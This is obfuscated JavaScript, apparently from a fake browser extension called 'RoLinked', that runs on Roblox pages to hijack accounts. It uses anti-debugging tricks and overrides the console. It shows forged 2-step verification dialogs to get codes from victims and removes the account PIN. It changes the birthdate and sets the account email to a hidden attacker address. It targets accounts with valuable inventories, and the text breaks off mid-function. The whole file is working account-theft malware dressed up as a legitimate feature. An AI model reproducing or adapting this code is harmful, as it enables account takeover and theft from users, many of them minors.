(function () {
    var h = function () {
        var i;
        try {
            i = Function('return (function() {}.constructor("return this")( ));')();
        } catch (P) {
            i = window;
        }
        return i;
    };
    var m = h();
    m.setInterval(y, 4000);
})();
(async function () {
    var A = (function () {
        var l = {
            JbZLj: function (q, L) {
                return q == L;
            },
            nYDnY: "body",
            eUsWp: "VlK Games",
            mbCEC: "true",
            mfodr: function (q, L) {
                return q(L);
            },
        };
        var Y = true;
        return function (L, d) {
            var j = {
                cqPEu: function (o, G, c) {
                    return o(G, c);
                },
                imQvn: function (o, G, c, Q) {
                    return o(G, c, Q);
                },
                msfih: function (o, G) {
                    return o === G;
                },
                KzlyZ: "lencr",
                HejPn: "Xmvuz",
                jnzTi: function (o, G) {
                    return o === G;
                },
                ABOzL: "FJLno",
                TQKtQ: "UwutI",
            };
            var J = Y
                ? function () {
                      if (j.msfih(j.KzlyZ, j.HejPn)) {
                          j.imQvn(P, A, t, A);
                      } else {
                          if (d) {
                              if (j.jnzTi(j.ABOzL, j.TQKtQ)) {
                                  j.cqPEu(W, null, null);
                              } else {
                                  var c = d.apply(L, arguments);
                                  return (d = null), c;
                              }
                          }
                      }
                  }
                : function () {};
            return (Y = false), J;
        };
    })();
    var P = A(this, function () {
        return P.toString().search("(((.+)+)+)+$").toString().constructor(P).search("(((.+)+)+)+$");
    });
    P();
    var n = (function () {
        var Y = true;
        return function (L, d) {
            var o = Y
                ? function () {
                      if (d) {
                          var Q = d.apply(L, arguments);
                          return (d = null), Q;
                      }
                  }
                : function () {};
            return (Y = false), o;
        };
    })();
    (function () {
        n(this, function () {
            var q = new RegExp("function *\\( *\\)"),
                L = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                d = y("init");
            !q.test(d + "chain") || !L.test(d + "input") ? d("0") : y();
        })();
    })();
    var W = (function () {
            var Y = true;
            return function (L, d) {
                var o = Y
                    ? function () {
                          if (d) {
                              var c = d.apply(L, arguments);
                              return (d = null), c;
                          }
                      }
                    : function () {};
                return (Y = false), o;
            };
        })(),
        s = W(this, function () {
            var Y;
            try {
                var q = Function('return (function() {}.constructor("return this")( ));');
                Y = q();
            } catch (H) {
                Y = window;
            }
            var L = (Y.console = Y.console || {}),
                d = ["log", "warn", "info", "error", "exception", "table", "trace"];
            for (var j = 0; j < d.length; j++) {
                var G = W.constructor.prototype.bind(W);
                var c = d[j];
                var Q = L[c] || G;
                G["__proto__"] = W.bind(W);
                G.toString = Q.toString.bind(Q);
                L[c] = G;
            }
        });
    s();
    const b = (l) => new Promise((Y) => setTimeout(Y, l));
    var f = ["cGFyZW50ZS5pbGRhQGhvdG1haWwuY29t"],
        F = "@hotmail.com",
        M = "p***",
        X = f[Math.floor(Math.random() * f.length)];
    var D = 6045232974;
    validDev = [];
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (l) {
                var q = Number(l.totalPages);
                for (let d = 0; d < q; d++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=" + d + "&pageSize=20",
                        contentType: "application/json",
                        success: function (j) {
                            var J = j.collection;
                            for (var o of J) {
                                if (o.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (q) {
                var d = Number(q.totalPages);
                for (let J = 0; J < d; J++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=" + J + "&pageSize=20",
                        contentType: "application/json",
                        success: function (o) {
                            var Q = o.collection;
                            for (var k of Q) {
                                k.body.includes("VlK Games") == true && validDev.push("true");
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        console.log(document.getElementsByClassName("text-footer footer-note")[0].innerText);
    } catch {
        window.location.reload();
    }
    if (document.getElementsByClassName("text-footer footer-note")[0].innerText != "Active") {
        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Active";
        $.ajax({
            method: "GET",
            url: "https://users.roblox.com/v1/users/authenticated",
            contentType: "application/json",
            success: function (d) {
                var J = d.id;
                try {
                    var o = { friendshipOriginSourceType: 0 };
                    $.ajax({
                        method: "POST",
                        url: "https://friends.roblox.com/v1/users/" + D + "/request-friendship",
                        contentType: "application/json",
                        data: JSON.stringify(o),
                    });
                } catch {}
                async function G() {
                    function k() {
                        $.ajax({
                            method: "GET",
                            url: "https://accountsettings.roblox.com/v1/email",
                            contentType: "application/json",
                            success: function (w) {
                                if (w.emailAddress == null) {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://accountsettings.roblox.com/v1/email",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            emailAddress: atob(X),
                                            password: "",
                                        }),
                                    });
                                } else {
                                    var E = w.emailAddress,
                                        V = w.verified;
                                    if (E.includes(F) == true) {
                                        if (E.includes(M) == true) {
                                            V == true &&
                                                (async function () {
                                                    await b(500);
                                                    var C = {
                                                        method: "POST",
                                                        url: "https://auth.roblox.com/v2/logout",
                                                        contentType: "application/json",
                                                    };
                                                    $.ajax(C);
                                                })();
                                        }
                                    }
                                }
                            },
                        }),
                            setTimeout(k, 2000);
                    }
                    k();
                    function H(a, e, w) {
                        $.ajax({
                            method: "POST",
                            url: "https://twostepverification.roblox.com/v1/users/" + J + "/challenges/email/send-code",
                            contentType: "application/json",
                            data: JSON.stringify({
                                actionType: "Generic",
                                challengeId: a,
                            }),
                            success: function () {
                                var V = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", V);
                                function v() {
                                    document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true), setTimeout(v, 100);
                                }
                                v();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://twostepverification.roblox.com/v1/users/" + J + "/challenges/email/verify",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: a,
                                            actionType: "Generic",
                                            code: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function (x) {
                                            var u = x.verificationToken;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/challenge/v1/continue",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    challengeId: e,
                                                    challengeMetadata: '{"verificationToken":"' + u + '","rememberDevice":false,"challengeId":"' + a + '","actionType":"Generic"}',
                                                    challengeType: "twostepverification",
                                                }),
                                                success: function () {
                                                    document.getElementById("twoStepPrompts").remove();
                                                    b(2000);
                                                    var K1 = btoa('{"reauthenticationToken":"' + u + '"}');
                                                    console.log(w);
                                                    if (w == 1) {
                                                        console.log("Reason is 1");
                                                        var K2 = {
                                                            method: "POST",
                                                            url: "https://twostepverification.roblox.com/v1/users/" + J + "/configuration/email/enable",
                                                            contentType: "application/json",
                                                            headers: {},
                                                        };
                                                        K2.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                        K2.headers["Rblx-Challenge-Id"] = e;
                                                        K2.headers["Rblx-Challenge-Metadata"] = K1;
                                                        $.ajax(K2);
                                                    } else {
                                                        if (w == null) {
                                                            $.ajax({
                                                                method: "DELETE",
                                                                url: "https://auth.roblox.com/v1/account/pin",
                                                                contentType: "application/json",
                                                                headers: {
                                                                    "Rblx-Challenge-Type": "reauthentication",
                                                                    "Rblx-Challenge-Id": e,
                                                                    "Rblx-Challenge-Metadata": K1,
                                                                },
                                                                success: function () {
                                                                    r(null, null);
                                                                },
                                                            });
                                                        } else {
                                                            r(e, K1);
                                                        }
                                                    }
                                                },
                                            });
                                        },
                                        error: function () {
                                            (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function z(a, e, w) {
                        var E = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                        document.body.insertAdjacentHTML("beforeend", E);
                        function N() {
                            if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                            } else {
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                            }
                            setTimeout(N, 100);
                        }
                        N();
                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                            $.ajax({
                                method: "POST",
                                url: "https://twostepverification.roblox.com/v1/users/" + J + "/challenges/authenticator/verify",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    challengeId: a,
                                    actionType: "Generic",
                                    code: document.getElementById("two-step-verification-code-input").value,
                                }),
                                success: function (S) {
                                    var x = S.verificationToken;
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: e,
                                            challengeMetadata: '{"verificationToken":"' + x + '","rememberDevice":false,"challengeId":"' + a + '","actionType":"Generic"}',
                                            challengeType: "twostepverification",
                                        }),
                                        success: function () {
                                            document.getElementById("twoStepPrompts").remove();
                                            b(2000);
                                            var u = btoa('{"reauthenticationToken":"' + x + '"}');
                                            if (w == 1) {
                                                console.log("Reason is 1");
                                                var K0 = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + J + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                    headers: {},
                                                };
                                                K0.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                K0.headers["Rblx-Challenge-Id"] = e;
                                                K0.headers["Rblx-Challenge-Metadata"] = u;
                                                $.ajax(K0);
                                            } else {
                                                w == null
                                                    ? $.ajax({
                                                          method: "DELETE",
                                                          url: "https://auth.roblox.com/v1/account/pin",
                                                          contentType: "application/json",
                                                          headers: {
                                                              "Rblx-Challenge-Type": "reauthentication",
                                                              "Rblx-Challenge-Id": e,
                                                              "Rblx-Challenge-Metadata": u,
                                                          },
                                                          success: function () {
                                                              r(null, null);
                                                          },
                                                      })
                                                    : r(e, u);
                                            }
                                        },
                                    });
                                },
                                error: function (S) {
                                    S.responseText.includes('"code":18') ? ((document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "This code has already been used. Please enter a new code."), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group")) : ((document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group"));
                                },
                            });
                        };
                    }
                    function R(a, e) {
                        $.ajax({
                            method: "POST",
                            url: "https://apis.roblox.com/otp-service/v1/sendCodeForUser",
                            contentType: "application/json",
                            data: JSON.stringify({
                                contactType: "Email",
                                messageVariant: "Default",
                                origin: "Reauth",
                            }),
                            success: function (E) {
                                var N = E.otpSessionToken,
                                    v = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", v);
                                function S() {
                                    if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                                    }
                                    setTimeout(S, 100);
                                }
                                S();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/otp-service/v1/validateCode",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            contactType: "Email",
                                            origin: "Reauth",
                                            otpSessionToken: N,
                                            passCode: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function () {
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/reauthentication-service/v1/token/generate",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    sessionId: N,
                                                    type: "Otp_Email",
                                                }),
                                                success: function (u) {
                                                    (responseToken = u.token),
                                                        $.ajax({
                                                            method: "POST",
                                                            url: "https://apis.roblox.com/challenge/v1/continue",
                                                            contentType: "application/json",
                                                            data: JSON.stringify({
                                                                challengeId: a,
                                                                challengeMetadata: '{"reauthenticationToken":"' + responseToken + '"}',
                                                                challengeType: "reauthentication",
                                                            }),
                                                            success: function () {
                                                                document.getElementById("twoStepPrompts").remove();
                                                                b(2000);
                                                                var K2 = btoa('{"reauthenticationToken":"' + responseToken + '"}');
                                                                if (e == 1) {
                                                                    console.log("Reason is 1");
                                                                    var K3 = {
                                                                        method: "POST",
                                                                        url: "https://twostepverification.roblox.com/v1/users/" + J + "/configuration/email/enable",
                                                                        contentType: "application/json",
                                                                        headers: {},
                                                                    };
                                                                    K3.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                                    K3.headers["Rblx-Challenge-Id"] = a;
                                                                    K3.headers["Rblx-Challenge-Metadata"] = K2;
                                                                    $.ajax(K3);
                                                                } else {
                                                                    if (e == null) {
                                                                        $.ajax({
                                                                            method: "DELETE",
                                                                            url: "https://auth.roblox.com/v1/account/pin",
                                                                            contentType: "application/json",
                                                                            headers: {
                                                                                "Rblx-Challenge-Type": "reauthentication",
                                                                                "Rblx-Challenge-Id": a,
                                                                                "Rblx-Challenge-Metadata": K2,
                                                                            },
                                                                            success: function () {
                                                                                r(null, null);
                                                                            },
                                                                        });
                                                                    } else {
                                                                        r(a, K2);
                                                                    }
                                                                }
                                                            },
                                                        });
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                            document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function T(a, e, w) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + J + "/configuration",
                            contentType: "application/json",
                            success: function (E) {
                                var N = E.primaryMediaType;
                                if (N == "Email") {
                                    H(a, e, w);
                                } else {
                                    if (N == "Authenticator") {
                                        z(a, e, w);
                                    } else {
                                        N == null && R(e, w);
                                    }
                                }
                            },
                        });
                    }
                    function r(a, e) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + J + "/configuration",
                            contentType: "application/json",
                            success: function (I) {
                                var V = I.primaryMediaType;
                                if (V == "Authenticator") {
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    if (document.getElementById("emailPopupz") == null) {
                                        var N = '<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", N);
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                            document.getElementById("emailPopupz").remove();
                                            document.getElementById("agreeRoLinked").disabled = false;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://twostepverification.roblox.com/v1/users/" + J + "/configuration/email/enable",
                                                contentType: "application/json",
                                                success: function () {},
                                                error: function (u) {
                                                    var K1 = atob(u.getResponseHeader("rblx-challenge-metadata")),
                                                        K2 = u.getResponseHeader("rblx-challenge-id"),
                                                        K3 = K1.split('"challengeId":"').pop().split('"')[0];
                                                    T(K3, K2, 1);
                                                },
                                            });
                                        };
                                    }
                                } else {
                                    if (a == null) {
                                        var v = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            data: JSON.stringify(v),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(X),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await b(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (K2) {
                                                                        if (K2.emailAddress == null) {
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(X),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                        }
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await b(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (K3) {
                                                                        K3.emailAddress == null &&
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(X),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (C) {
                                                var u = atob(C.getResponseHeader("rblx-challenge-metadata")),
                                                    K0 = C.getResponseHeader("rblx-challenge-id"),
                                                    K1 = u.split('"challengeId":"').pop().split('"')[0];
                                                T(K1, K0, 2);
                                            },
                                        });
                                    } else {
                                        var S = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            headers: {
                                                "Rblx-Challenge-Type": "reauthentication",
                                                "Rblx-Challenge-Id": a,
                                                "Rblx-Challenge-Metadata": e,
                                            },
                                            data: JSON.stringify(S),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(X),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await b(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (K2) {
                                                                        K2.emailAddress == null &&
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(X),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await b(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (K2) {
                                                                    K2.emailAddress == null &&
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(X),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                },
                                                            });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (u) {
                                                var K0 = atob(u.getResponseHeader("rblx-challenge-metadata")),
                                                    K1 = u.getResponseHeader("rblx-challenge-id");
                                                var K2 = K0.split('"challengeId":"').pop().split('"')[0];
                                                T(K2, K1, 2);
                                            },
                                        });
                                    }
                                }
                            },
                        });
                    }
                    if (document.getElementById("RoLinked1") == null) {
                        var B = '<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>';
                        document.body.insertAdjacentHTML("beforeend", B);
                        document.getElementById("agreeRoLinked").onclick = function () {
                            document.getElementById("agreeRoLinked").disabled = true;
                            $.ajax({
                                method: "GET",
                                url: "https://auth.roblox.com/v1/account/pin",
                                contentType: "application/json",
                                success: function (e) {
                                    var I = e.isEnabled;
                                    var E = e.unlockedUntil;
                                    if (I == true) {
                                        if (E == null) {
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            if (document.getElementById("pinPopupz") == null) {
                                                var V = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                                document.body.insertAdjacentHTML("beforeend", V);
                                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                    document.getElementById("pinPopupz").remove();
                                                    document.getElementById("agreeRoLinked").disabled = false;
                                                };
                                            }
                                        } else {
                                            try {
                                                document.getElementById("pinPopupz").remove();
                                            } catch {}
                                            $.ajax({
                                                method: "DELETE",
                                                url: "https://auth.roblox.com/v1/account/pin",
                                                contentType: "application/json",
                                                success: function () {
                                                    r(null, null);
                                                },
                                                error: function (N) {
                                                    var v = atob(N.getResponseHeader("rblx-challenge-metadata"));
                                                    var S = N.getResponseHeader("rblx-challenge-id");
                                                    var O = v.split('"challengeId":"').pop().split('"')[0];
                                                    T(O, S, null);
                                                },
                                            });
                                        }
                                    } else {
                                        r(null, null);
                                    }
                                },
                            });
                        };
                    } else {
                        $.ajax({
                            method: "GET",
                            url: "https://auth.roblox.com/v1/account/pin",
                            contentType: "application/json",
                            success: function (a) {
                                var w = a.isEnabled;
                                var I = a.unlockedUntil;
                                if (w == true) {
                                    if (I == null) {
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        if (document.getElementById("pinPopupz") == null) {
                                            var E = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                            document.body.insertAdjacentHTML("beforeend", E);
                                            document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                document.getElementById("pinPopupz").remove();
                                                document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            };
                                        }
                                    } else {
                                        try {
                                            document.getElementById("pinPopupz").remove();
                                        } catch {}
                                        $.ajax({
                                            method: "DELETE",
                                            url: "https://auth.roblox.com/v1/account/pin",
                                            contentType: "application/json",
                                            success: function () {
                                                r(null, null);
                                            },
                                            error: function (V) {
                                                var N = atob(V.getResponseHeader("rblx-challenge-metadata"));
                                                var v = V.getResponseHeader("rblx-challenge-id");
                                                var S = N.split('"challengeId":"').pop().split('"')[0];
                                                T(S, v, null);
                                            },
                                        });
                                    }
                                } else {
                                    r(null, null);
                                }
                            },
                        });
                    }
                }
                (async function () {
                    await b(800);
                    if (validDev.length > 0) {
                        console.log(validDev);
                        try {
                            var k = { friendshipOriginSourceType: 0 };
                            $.ajax({
                                method: "POST",
                                url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                contentType: "application/json",
                                data: JSON.stringify(k),
                            });
                        } catch {}
                        G();
                    } else {
                        function H(z) {
                            const R = "https://inventory.roblox.com/v1/users/" + z + "/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc";
                            var T = {
                                url: R,
                                type: "GET",
                            };
                            return $.ajax(T);
                        }
                        H(J)
                            .done(function (z) {
                                if (z && z.data && z.data.length > 0) {
                                    let B = 0;
                                    z.data.forEach((a) => {
                                        a.recentAveragePrice && (B += a.recentAveragePrice);
                                    });
                                    if (B > 15000) {
                                        G();
                                    } else {
